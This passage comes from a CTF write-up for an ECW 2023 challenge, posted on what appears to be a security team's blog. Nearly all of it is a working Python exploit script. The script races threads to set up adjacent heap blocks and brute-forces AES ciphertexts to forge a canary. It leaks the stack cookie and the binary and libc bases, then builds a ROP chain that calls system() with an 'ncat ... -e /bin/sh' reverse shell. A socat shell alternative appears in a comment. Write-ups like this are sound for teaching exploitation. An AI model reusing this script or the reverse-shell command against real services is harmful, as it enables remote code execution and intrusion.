+</span></span><span style=display:flex><span>    <span style=color:#75715e># Search duplicate blocks</span>
+</span></span><span style=display:flex><span>    candidates_blk <span style=color:#f92672>=</span> [block_id <span style=color:#66d9ef>for</span> block_id, count <span style=color:#f92672>in</span> collections<span style=color:#f92672>.</span>Counter(block_ids)<span style=color:#f92672>.</span>items() <span style=color:#66d9ef>if</span> count <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Search candidates where the first block is the plaintext one</span>
+</span></span><span style=display:flex><span>    exploitables_blk <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> candidate_blk_id <span style=color:#f92672>in</span> candidates_blk:
+</span></span><span style=display:flex><span>        io<span style=color:#f92672>.</span>send(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&lt;III&#34;</span>, REQ_WRITE, candidate_blk_id, enc_blk_size))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        status <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>0.5</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(status) <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>and</span> int<span style=color:#f92672>.</span>from_bytes(status, <span style=color:#e6db74>&#34;little&#34;</span>) <span style=color:#f92672>==</span> STATUS_OVERFLOW:
+</span></span><span style=display:flex><span>            <span style=color:#75715e># We have found an exploitable layout (i.e [small plaintext block] -&gt; [big encrypted block])</span>
+</span></span><span style=display:flex><span>            exploitables_blk<span style=color:#f92672>.</span>append(candidate_blk_id)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            <span style=color:#75715e># Wrong block disposition. Send block data to complete the write command</span>
+</span></span><span style=display:flex><span>            io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;a&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>            io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> exploitables_blk
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setup_exploitable_blocks</span>(io: tube, size_1: int, size_2: int) <span style=color:#f92672>-&gt;</span> int:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Setup the memory to trigger the confusion vulnerability
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    The first block must be a plaintext block of size &#34;size_1&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    The second block must be an encrypted block of size &#34;size_2&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    They must be adjacent, but if blocks have the same id, this is always the case
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    block_ids  <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>    exp_blocks <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Loop will we don&#39;t have exploitable conditions (explained above)</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> len(exp_blocks) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
+</span></span><span style=display:flex><span>        client_clear(io)
+</span></span><span style=display:flex><span>        block_ids<span style=color:#f92672>.</span>clear()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        t1 <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>client_loop, args<span style=color:#f92672>=</span>(block_ids, size_1, <span style=color:#66d9ef>False</span>))
+</span></span><span style=display:flex><span>        t2 <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>client_loop, args<span style=color:#f92672>=</span>(block_ids, size_2, <span style=color:#66d9ef>True</span>))
+</span></span><span style=display:flex><span>        t1<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>        t2<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>        t1<span style=color:#f92672>.</span>join()
+</span></span><span style=display:flex><span>        t2<span style=color:#f92672>.</span>join()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        exp_blocks <span style=color:#f92672>=</span> find_exploitable_blocks(io, block_ids, size_2)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Arbitrary choose the first block</span>
+</span></span><span style=display:flex><span>    exp_block_id <span style=color:#f92672>=</span> exp_blocks[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Free the memory. Not necessary but for cleaner memory space</span>
+</span></span><span style=display:flex><span>    [client_free(io, block_id) <span style=color:#66d9ef>for</span> block_id <span style=color:#f92672>in</span> block_ids <span style=color:#66d9ef>if</span> block_id <span style=color:#f92672>!=</span> exp_block_id]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> exp_block_id
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_leak_payload</span>(block_id: int, small_block_size: int) <span style=color:#f92672>-&gt;</span> bytes:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Try to find an encrypted block that can overwrite the canary and the encrypted size
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    of the adjacent block correctly
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Returns the data of the payload to send
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Generate the canary value using the same algorithm</span>
+</span></span><span style=display:flex><span>    block_canary <span style=color:#f92672>=</span> (block_id <span style=color:#f92672>*</span> <span style=color:#ae81ff>0xdeadbeef</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    aes_cipher <span style=color:#f92672>=</span> Cipher(algorithms<span style=color:#f92672>.</span>AES(AES_KEY), modes<span style=color:#f92672>.</span>CBC(AES_IV), backend<span style=color:#f92672>=</span>default_backend())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>        aes_encryptor <span style=color:#f92672>=</span> aes_cipher<span style=color:#f92672>.</span>encryptor()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        data   <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(small_block_size)
+</span></span><span style=display:flex><span>        cipher <span style=color:#f92672>=</span> aes_encryptor<span style=color:#f92672>.</span>update(data <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x05</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>5</span>) <span style=color:#f92672>+</span> aes_encryptor<span style=color:#f92672>.</span>finalize()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        canary   <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(cipher[small_block_size:small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>], <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>        dec_size <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(cipher[small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>:small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>], <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># Search for:</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - correct canary value</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - an overwritten &#34;dec_size&#34; &gt; 840  (to leak the stack cookie, the binary base and the libc base)</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - an overwritten &#34;dec_size&#34; &lt; 4096 (to avoid reading at non allocated memory)</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> canary <span style=color:#f92672>==</span> block_canary <span style=color:#f92672>and</span> dec_size <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>840</span> <span style=color:#f92672>and</span> dec_size <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>4096</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> data
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_exploit_payload</span>(block_id: int, small_block_size: int, rop_chain_size: int) <span style=color:#f92672>-&gt;</span> bytes:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Try to find an encrypted block that can overwrite the canary and the encrypted size
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    of the adjacent block correctly
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Returns the data of the payload to send
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Generate the canary value using the same algorithm</span>
+</span></span><span style=display:flex><span>    block_canary <span style=color:#f92672>=</span> (block_id <span style=color:#f92672>*</span> <span style=color:#ae81ff>0xdeadbeef</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    aes_cipher <span style=color:#f92672>=</span> Cipher(algorithms<span style=color:#f92672>.</span>AES(AES_KEY), modes<span style=color:#f92672>.</span>CBC(AES_IV), backend<span style=color:#f92672>=</span>default_backend())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>        aes_encryptor <span style=color:#f92672>=</span> aes_cipher<span style=color:#f92672>.</span>encryptor()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        data   <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(small_block_size)
+</span></span><span style=display:flex><span>        cipher <span style=color:#f92672>=</span> aes_encryptor<span style=color:#f92672>.</span>update(data <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x06</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>+</span> aes_encryptor<span style=color:#f92672>.</span>finalize()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        canary <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(cipher[small_block_size:small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>], <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>        enc_size <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(cipher[small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>:small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>6</span>], <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># Search for:</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - correct canary value</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - an overwritten &#34;enc_size&#34; large enough to overwrite return address and hold the rop chain</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> canary <span style=color:#f92672>==</span> block_canary <span style=color:#f92672>and</span> enc_size <span style=color:#f92672>&gt;</span> OFFSET_RET_ADDR <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> rop_chain_size:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> data
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rop_write</span>(libc: ELF, where: int, what: bytes) <span style=color:#f92672>-&gt;</span> bytes:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(what) <span style=color:#f92672>%</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>ValueError</span>(<span style=color:#e6db74>&#34;Write data size must be multiple of 8&#34;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    rop_chain <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(what), <span style=color:#ae81ff>8</span>):
+</span></span><span style=display:flex><span>        block <span style=color:#f92672>=</span> what[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>]
+</span></span><span style=display:flex><span>        addr  <span style=color:#f92672>=</span> where <span style=color:#f92672>+</span> i
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        rop_chain <span style=color:#f92672>+=</span> p64(libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> GADGET_POP_RDI)
+</span></span><span style=display:flex><span>        rop_chain <span style=color:#f92672>+=</span> p64(addr)
+</span></span><span style=display:flex><span>        rop_chain <span style=color:#f92672>+=</span> p64(libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> GADGET_POP_RSI)
+</span></span><span style=display:flex><span>        rop_chain <span style=color:#f92672>+=</span> block
+</span></span><span style=display:flex><span>        rop_chain <span style=color:#f92672>+=</span> p64(libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> GADGET_WWW)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> rop_chain
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> remote(SERVER_ADDR, SERVER_PORT)
+</span></span><span style=display:flex><span>    libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./libc.so.6&#34;</span>)
+</span></span><span style=display:flex><span>    print(libc)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># =============== LEAK PART ===============</span>
+</span></span><span style=display:flex><span>    leak_small_blk_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>11</span>
+</span></span><span style=display:flex><span>    leak_big_blk_size   <span style=color:#f92672>=</span> <span style=color:#ae81ff>16</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    exp_blk_id <span style=color:#f92672>=</span> setup_exploitable_blocks(io, leak_small_blk_size, leak_big_blk_size)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Choosen block ID for exploitation : </span><span style=color:#e6db74>%u</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> exp_blk_id)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> get_leak_payload(exp_blk_id, leak_small_blk_size)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Using leak payload : </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> payload<span style=color:#f92672>.</span>hex())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    client_write(io, exp_blk_id, payload, leak_small_blk_size)
+</span></span><span style=display:flex><span>    client_free(io, exp_blk_id) <span style=color:#75715e># Free the small block to unlock read on the big block</span>
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Payload sent !&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    leak <span style=color:#f92672>=</span> client_read(io, exp_blk_id)
+</span></span><span style=display:flex><span>    print(leak)
+</span></span><span style=display:flex><span>    client_free(io, exp_blk_id)
+</span></span><span style=display:flex><span>    stack_cookie <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(leak[OFFSET_STACK_COOKIE:OFFSET_STACK_COOKIE<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>], <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>    binary_base <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(leak[OFFSET_RET_ADDR:OFFSET_RET_ADDR<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>], <span style=color:#e6db74>&#34;little&#34;</span>) <span style=color:#f92672>-</span> DIFF_BIN_BASE
+</span></span><span style=display:flex><span>    libc_base <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(leak[OFFSET_LIBC_ADDR:OFFSET_LIBC_ADDR<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>], <span style=color:#e6db74>&#34;little&#34;</span>) <span style=color:#f92672>-</span> DIFF_LIBC_BASE
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Leaked stack cookie : </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> stack_cookie)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Leaked binary base  : </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> binary_base)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Leaked libc base    : </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> libc_base)
+</span></span><span style=display:flex><span>    libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_base
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] System address      : </span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#34;system&#34;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># =============== EXPLOIT PART ===============</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    system_cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;ncat </span><span style=color:#e6db74>{</span>REMOTE_SHELL_ADDR<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>REMOTE_SHELL_PORT<span style=color:#e6db74>}</span><span style=color:#e6db74> -e /bin/sh&#34;</span><span style=color:#f92672>.</span>encode()
+</span></span><span style=display:flex><span>    <span style=color:#75715e># system_cmd = f&#34;socat TCP:127.0.0.1:4242 EXEC:sh&#34;.encode() + b&#34;\x00&#34; * 16</span>
+</span></span><span style=display:flex><span>    system_cmd <span style=color:#f92672>+=</span> (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> ( <span style=color:#ae81ff>16</span> <span style=color:#f92672>-</span> (len(system_cmd) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    write_addr <span style=color:#f92672>=</span> binary_base <span style=color:#f92672>+</span> BSS_SEC_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x300</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    rop_chain <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    rop_chain <span style=color:#f92672>+=</span> rop_write(libc, write_addr, system_cmd)
+</span></span><span style=display:flex><span>    rop_chain <span style=color:#f92672>+=</span> p64(libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> GADGET_POP_RDI)
+</span></span><span style=display:flex><span>    rop_chain <span style=color:#f92672>+=</span> p64(write_addr)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Realign stack on 16-bytes if needed (reguired by the ABI before any call)</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(rop_chain) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;[!] The stack is not aligned. Realigning...&#34;</span>)
+</span></span><span style=display:flex><span>        rop_chain <span style=color:#f92672>+=</span> p64(libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> GADGET_RET)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    rop_chain <span style=color:#f92672>+=</span> p64(libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#34;system&#34;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    exp_small_blk_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span>    exp_big_blk_size   <span style=color:#f92672>=</span> <span style=color:#ae81ff>16</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    exp_blk_id <span style=color:#f92672>=</span> setup_exploitable_blocks(io, exp_small_blk_size, exp_big_blk_size)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Choosen block ID for exploitation : </span><span style=color:#e6db74>%u</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> exp_blk_id)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> get_exploit_payload(exp_blk_id, exp_small_blk_size, len(rop_chain))
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Using exploit payload : </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> payload<span style=color:#f92672>.</span>hex())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    client_write(io, exp_blk_id, payload, exp_small_blk_size)
+</span></span><span style=display:flex><span>    client_free(io, exp_blk_id) <span style=color:#75715e># Free the small block to unlock read on the big block</span>
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Payload sent !&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;a&#34;</span> <span style=color:#f92672>*</span> OFFSET_STACK_COOKIE
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> p64(stack_cookie)
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;a&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x18</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> rop_chain
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    client_write(io, exp_blk_id, payload, len(payload))
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[*] Enjoy your shell !&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>send_defrag</span>(s: socket<span style=color:#f92672>.</span>socket, password: bytes):
+</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>send(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&lt;I&#34;</span>, <span style=color:#ae81ff>7</span>))
+</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>send(password)
+</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div><p>Flag: <code>ECW{IL0v3Mult1thr3ad1ngS1d3Eff3ct5S000Much!}</code></p><p>Even if you got stuck on this challenge, I hope you enjoyed it!</p></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/ctf>#CTF</a></div><div class=tag><a href=/tags/writeup>#Writeup</a></div><div class=tag><a href=/tags/ecw-2023>#ECW 2023</a></div><div class=tag><a href=/tags/exploit>#Exploit</a></div><div class=tag><a href=/tags/linux>#Linux</a></div></div><span class=date>2023-11-07
+<span class=author>by
+Maxime Turlure</span></span></div></footer></article><footer><div class=social-links-footer><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>GitHub</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div><div class=copyright>Copyright (c) 2020, all rights reserved.</div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>
